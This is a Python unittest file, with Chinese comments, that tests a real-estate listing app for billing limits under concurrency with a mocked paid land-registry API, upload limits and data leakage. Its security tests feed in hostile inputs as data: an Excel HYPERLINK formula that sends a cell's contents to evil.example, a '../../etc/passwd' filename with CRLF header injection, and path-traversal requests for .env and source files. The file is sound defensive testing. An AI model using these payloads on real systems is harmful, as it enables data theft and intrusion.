"""多人使用／資安測試（不連網、不扣款）：付費 API 併發、檔案上傳限制、Excel 公式注入、個資不外洩。"""
import io
import json
import logging
import os
import sys
import tempfile
import threading
import time
import unittest
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import httpx  # noqa: E402
from openpyxl import load_workbook  # noqa: E402

from services import moi  # noqa: E402


class SlowPlatform:
    """假的地政平台：回應有延遲（讓執行緒真的交錯），而且 thread-safe 地計次。"""

    def __init__(self, delay=0.05, expire_first_token=False, raise_timeout=False):
        self.lock = threading.Lock()
        self.paid_calls = 0
        self.token_calls = 0
        self.delay, self.raise_timeout = delay, raise_timeout
        self.expire_first_token = expire_first_token

    def handler(self, req: httpx.Request):
        if req.url.path.endswith("/cp/getToken"):
            with self.lock:
                self.token_calls += 1
                n = self.token_calls
            return httpx.Response(200, json={"access_token": f"tok{n}"})
        if self.raise_timeout:
            with self.lock:
                self.paid_calls += 1
            raise httpx.ReadTimeout("timeout", request=req)
        if self.expire_first_token and req.headers["Authorization"] == "Bearer tok1":
            return httpx.Response(401, json={"message": "token expired"})
        time.sleep(self.delay)
        with self.lock:
            self.paid_calls += 1
        return httpx.Response(200, json={"STATUS": 1, "RESPONSE": [{"LANDREG": {"LANDAREA": "100"}}]})

    def client(self):
        return httpx.Client(transport=httpx.MockTransport(self.handler))


class MoiConcurrencyTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        d = Path(self.tmp.name)
        self.saved = (moi.DATA, moi.CACHE, moi.USAGE, dict(os.environ))
        moi.DATA, moi.CACHE, moi.USAGE = d, d / "c.json", d / "u.json"
        moi._token.update(value=None, at=0)
        os.environ.update(MOI_COP_CLIENT_ID="id", MOI_COP_SECRET="sec", MOI_DAILY_LIMIT="3")

    def tearDown(self):
        moi.DATA, moi.CACHE, moi.USAGE, env = self.saved
        os.environ.clear()
        os.environ.update(env)
        moi._token.update(value=None, at=0)
        self.tmp.cleanup()

    def run_parallel(self, fake, nos, today="2026-10-20"):
        def one(no):
            try:
                return moi.query_land("XA", "0101", no, client=fake.client(), today=today)
            except moi.MoiError as e:
                return e
        with ThreadPoolExecutor(max_workers=len(nos)) as ex:
            return list(ex.map(one, nos))

    def test_daily_limit_holds_under_concurrency(self):
        fake = SlowPlatform()
        res = self.run_parallel(fake, [f"{i:04d}0000" for i in range(1, 13)])   # 12 個不同地號同時查，上限 3
        self.assertEqual(fake.paid_calls, 3)                 # 不能超過上限
        self.assertEqual(moi.used_today("2026-10-20"), 3)
        self.assertEqual(sum(isinstance(r, moi.MoiError) for r in res), 9)

    def test_same_parcel_charged_once_under_concurrency(self):
        fake = SlowPlatform()
        res = self.run_parallel(fake, ["01230000"] * 10)     # 同一筆被 10 個人（或連按）同時查
        self.assertEqual(fake.paid_calls, 1)
        self.assertEqual(moi.used_today("2026-10-20"), 1)
        self.assertTrue(all(not isinstance(r, Exception) and r["area_sqm"] == 100 for r in res))

    def test_corrupt_usage_file_fails_closed(self):
        moi.USAGE.write_text("{broken", encoding="utf-8")
        fake = SlowPlatform()
        with self.assertRaises(moi.MoiError):
            moi.query_land("XA", "0101", "01230000", client=fake.client(), today="2026-10-20")
        self.assertEqual(fake.paid_calls, 0)                 # 用量檔壞了不能當作「今天 0 筆」繼續扣款

    def test_corrupt_cache_is_quarantined_not_overwritten(self):
        moi.CACHE.write_text("not json", encoding="utf-8")
        moi.query_land("XA", "0101", "01230000", client=SlowPlatform().client(), today="2026-10-20")
        self.assertTrue(list(Path(self.tmp.name).glob("c.json.bad*")))   # 壞檔保留供人工檢查
        self.assertIn("XA-0101-01230000", json.loads(moi.CACHE.read_text(encoding="utf-8")))

    def test_writes_are_atomic_no_tmp_left(self):
        moi.query_land("XA", "0101", "01230000", client=SlowPlatform().client(), today="2026-10-20")
        self.assertFalse(list(Path(self.tmp.name).glob("*.tmp")))

    def test_expired_token_refreshed_once_and_charged_once(self):
        fake = SlowPlatform(expire_first_token=True)
        r = moi.query_land("XA", "0101", "01230000", client=fake.client(), today="2026-10-20")
        self.assertEqual(r["area_sqm"], 100)
        self.assertEqual(fake.token_calls, 2)                # 換了新 token
        self.assertEqual(fake.paid_calls, 1)
        self.assertEqual(moi.used_today("2026-10-20"), 1)    # 被 401 拒絕的那次沒計費

    def test_timeout_becomes_moi_error_and_is_counted(self):
        fake = SlowPlatform(raise_timeout=True)
        with self.assertRaises(moi.MoiError) as e:
            moi.query_land("XA", "0101", "01230000", client=fake.client(), today="2026-10-20")
        self.assertIn("可能已被計費", str(e.exception))
        self.assertEqual(moi.used_today("2026-10-20"), 1)    # 逾時也算一次（平台可能已計費），不會無限重試

    def test_garbage_platform_body_is_handled(self):
        for body in (json.dumps([1, 2]), json.dumps({"STATUS": 1, "RESPONSE": "oops"}), "<html>maintenance</html>"):
            def h(req, body=body):
                if req.url.path.endswith("getToken"):
                    return httpx.Response(200, json={"access_token": "t"})
                return httpx.Response(200, content=body)
            with self.assertRaises(moi.MoiError):
                moi.query_land("XA", "0101", "09990000", client=httpx.Client(transport=httpx.MockTransport(h)),
                               today="2026-10-20")

    def test_day_rolls_over_in_taipei_time(self):
        self.assertRegex(moi.today_str(), r"^\d{4}-\d{2}-\d{2}$")
        self.assertEqual(moi.TZ.utcoffset(None).total_seconds(), 8 * 3600)


class ApiSecurityTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from fastapi.testclient import TestClient
        import main
        cls.main = main
        cls.client = TestClient(main.app)

    def make_pdf(self, text, pages=1):
        import fitz
        doc = fitz.open()
        for _ in range(pages):
            page = doc.new_page()
            page.insert_text((50, 80), text, fontname="china-t", fontsize=11)
        data = doc.tobytes()
        doc.close()
        return data

    def post_pdf(self, data):
        return self.client.post("/api/parse-tenement", files={"file": ("t.pdf", data, "application/pdf")})

    def test_oversized_pdf_rejected(self):
        r = self.post_pdf(b"%PDF-" + b"0" * (self.main.MAX_PDF + 10))
        self.assertEqual(r.status_code, 400)
        self.assertIn("太大", r.json()["detail"])

    def test_non_pdf_and_garbage_pdf_rejected_without_leaking_internals(self):
        self.assertEqual(self.post_pdf(b"hello").status_code, 400)
        r = self.post_pdf(b"%PDF-1.7\n garbage garbage")
        self.assertEqual(r.status_code, 400)
        self.assertNotIn("Traceback", r.text)

    def test_too_many_pages_rejected(self):
        r = self.post_pdf(self.make_pdf("x", pages=45))
        self.assertEqual(r.status_code, 400)
        self.assertIn("頁數", r.json()["detail"])

    def test_owner_name_never_returned_or_logged(self):
        text = "建物標示部 建物門牌 示範市示範路1號 所有權人 王大明 統一編號 A123456789"
        with self.assertLogs(level="DEBUG") as cm:
            logging.getLogger("probe").info("probe")
            r = self.post_pdf(self.make_pdf(text))
        self.assertEqual(r.status_code, 200)
        blob = r.text + "\n".join(cm.output)
        self.assertNotIn("王大明", blob)
        self.assertNotIn("A123456789", blob)

    def test_bad_json_is_400_not_500(self):
        for path in ("/api/risk", "/api/generate-name", "/api/generate-sell-points"):
            r = self.client.post(path, data={"form_json": "{not json", "deed_json": "[1]"})
            self.assertEqual(r.status_code, 400, path)
        r = self.client.post("/api/generate", data={"form_json": "[1,2]"})
        self.assertEqual(r.status_code, 400)

    def test_generate_filename_cannot_traverse_or_inject_headers(self):
        evil = "../../etc/passwd\r\nX-Evil: 1"
        r = self.client.post("/api/generate", data={"form_json": json.dumps({"address": evil})})
        self.assertEqual(r.status_code, 200)
        cd = r.headers["content-disposition"]
        self.assertNotIn("/", cd.split("''", 1)[1])
        self.assertNotIn("%2F", cd.split("''", 1)[1].upper())
        self.assertNotIn("x-evil", {k.lower() for k in r.headers})

    def _png(self):
        from PIL import Image
        b = io.BytesIO()
        Image.new("RGB", (40, 30), "red").save(b, "PNG")
        return b.getvalue()

    def test_formula_injection_neutralised_in_excel(self):
        payloads = ['=HYPERLINK("http://evil.example/?"&A1,"x")', "+1+1", "-2+3", "@SUM(1,1)"]
        for p in payloads:
            form = {"address": p, "case_name": p, "agent": p, "nearby_park": p}
            r = self.client.post("/api/generate", data={"form_json": json.dumps(form)},
                                 files=[("photos", ("=cmd.jpg", self._png(), "image/png"))])
            self.assertEqual(r.status_code, 200)
            wb = load_workbook(io.BytesIO(r.content))
            seen = 0
            for ws in wb.worksheets:
                for row in ws.iter_rows():
                    for c in row:
                        if isinstance(c.value, str) and c.value[:1] in ("=", "+", "-", "@"):
                            seen += 1
                            self.assertEqual(c.data_type, "s", f"{ws.title}!{c.coordinate} 變成公式：{c.value}")
            self.assertGreater(seen, 0)

    def test_concurrent_generate_never_mixes_users(self):
        """10 位經紀人同時產生：每份 Excel 只含自己的地址（沒有共用暫存檔或全域狀態）。"""
        from fastapi.testclient import TestClient
        main = self.main

        def one(i):
            c = TestClient(main.app)
            r = c.post("/api/generate", data={"form_json": json.dumps({"address": f"示範市第{i}號客戶"})})
            wb = load_workbook(io.BytesIO(r.content))
            vals = {str(x.value) for row in wb.worksheets[0].iter_rows() for x in row if x.value is not None}
            return i, r.status_code, vals

        with ThreadPoolExecutor(max_workers=10) as ex:
            out = list(ex.map(one, range(10)))
        for i, code, vals in out:
            self.assertEqual(code, 200)
            self.assertIn(f"示範市第{i}號客戶", vals)
            for j in range(10):
                if j != i:
                    self.assertNotIn(f"示範市第{j}號客戶", vals)

    def test_endpoints_do_not_serve_private_files(self):
        for p in ("/data/moi_usage.json", "/static/../.env", "/static/..%2f.env", "/static/%2e%2e/main.py", "/.env",
                  "/static/../main.py"):
            r = self.client.get(p)
            self.assertNotEqual(r.status_code, 200, p)

    def test_settings_survives_corrupt_usage(self):
        saved = moi.USAGE
        with tempfile.TemporaryDirectory() as d:
            moi.USAGE = Path(d) / "u.json"
            moi.USAGE.write_text("{bad", encoding="utf-8")
            try:
                r = self.client.get("/api/settings")
                self.assertEqual(r.status_code, 200)
            finally:
                moi.USAGE = saved


class MoiAreaFieldTest(unittest.TestCase):
    """面積欄位可設定；找不到或不是數字時要明確報錯，絕不默默回 0。"""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        d = Path(self.tmp.name)
        self.saved = (moi.DATA, moi.CACHE, moi.USAGE, dict(os.environ))
        moi.DATA, moi.CACHE, moi.USAGE = d, d / "c.json", d / "u.json"
        moi._token.update(value=None, at=0)
        os.environ.update(MOI_COP_CLIENT_ID="id", MOI_COP_SECRET="sec", MOI_DAILY_LIMIT="10")
        os.environ.pop("PSHEET_MOI_AREA_FIELD", None)

    def tearDown(self):
        moi.DATA, moi.CACHE, moi.USAGE, env = self.saved
        os.environ.clear()
        os.environ.update(env)
        moi._token.update(value=None, at=0)
        self.tmp.cleanup()

    def query(self, reg, no="01230000"):
        def h(req):
            if req.url.path.endswith("getToken"):
                return httpx.Response(200, json={"access_token": "t"})
            return httpx.Response(200, json={"STATUS": 1, "RESPONSE": [{"LANDREG": reg}]})
        return moi.query_land("XA", "0101", no, client=httpx.Client(transport=httpx.MockTransport(h)),
                              today="2026-10-20")

    def test_default_auto_detect_area_field(self):
        self.assertEqual(self.query({"ZONE": "住宅區", "LANDAREA": "330.5"})["area_sqm"], 330.5)

    def test_custom_field_name(self):
        os.environ["PSHEET_MOI_AREA_FIELD"] = "mj"
        self.assertEqual(self.query({"LANDAREA": "1", "MJ": "250"}, "00010000")["area_sqm"], 250)

    def test_custom_field_missing_is_clear_error(self):
        os.environ["PSHEET_MOI_AREA_FIELD"] = "NOPE"
        with self.assertRaises(moi.MoiError) as e:
            self.query({"LANDAREA": "100"})
        self.assertIn("核對失敗：找不到面積欄位", str(e.exception))
        self.assertIn("NOPE", str(e.exception))

    def test_no_area_field_is_clear_error_and_not_cached(self):
        with self.assertRaises(moi.MoiError) as e:
            self.query({"ZONE": "住宅區", "SIZE": "100"})
        self.assertIn("核對失敗：找不到面積欄位", str(e.exception))
        self.assertIn("ZONE", str(e.exception))          # 列出實際欄位名稱方便設定
        self.assertIsNone(moi.cached("XA", "0101", "01230000"))

    def test_non_numeric_or_zero_value_is_error_not_zero(self):
        for v in ("abc", "", None, "0", "-5", "nan", "inf"):
            with self.assertRaises(moi.MoiError, msg=repr(v)) as e:
                self.query({"LANDAREA": v}, "00020000")
            self.assertIn("核對失敗", str(e.exception))

    def test_thousand_separator_ok(self):
        self.assertEqual(self.query({"LANDAREA": "1,234.5"}, "00030000")["area_sqm"], 1234.5)

    def test_api_returns_400_with_message_for_ui(self):
        from fastapi.testclient import TestClient
        import main
        from services import parcel

        async def fake_resolve(county, section, town=""):
            return "XA", "0101", "西區", "示範段"
        saved = parcel.resolve_section
        parcel.resolve_section = fake_resolve
        orig = httpx.Client

        def h(req):
            if req.url.path.endswith("getToken"):
                return httpx.Response(200, json={"access_token": "t"})
            return httpx.Response(200, json={"STATUS": 1, "RESPONSE": [{"LANDREG": {"ZONE": "x"}}]})
        httpx.Client = lambda *a, **k: orig(transport=httpx.MockTransport(h))
        try:
            r = TestClient(main.app).post("/api/official-land", data={
                "county": "示範市", "section": "示範段", "number": "123", "confirm": "1"})
        finally:
            parcel.resolve_section = saved
            httpx.Client = orig
        self.assertEqual(r.status_code, 400)
        self.assertIn("核對失敗：找不到面積欄位", r.json()["detail"])


if __name__ == "__main__":
    unittest.main()
